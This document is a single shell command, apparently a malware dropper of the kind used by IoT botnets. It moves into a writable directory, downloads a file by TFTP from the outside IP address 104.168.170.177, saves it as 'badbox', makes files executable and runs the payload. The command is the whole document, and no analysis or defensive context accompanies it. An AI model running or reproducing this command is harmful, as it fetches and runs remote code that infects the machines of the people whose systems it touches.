cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 104.168.170.177;cat ' ' >badbox;chmod +x *;./badbox
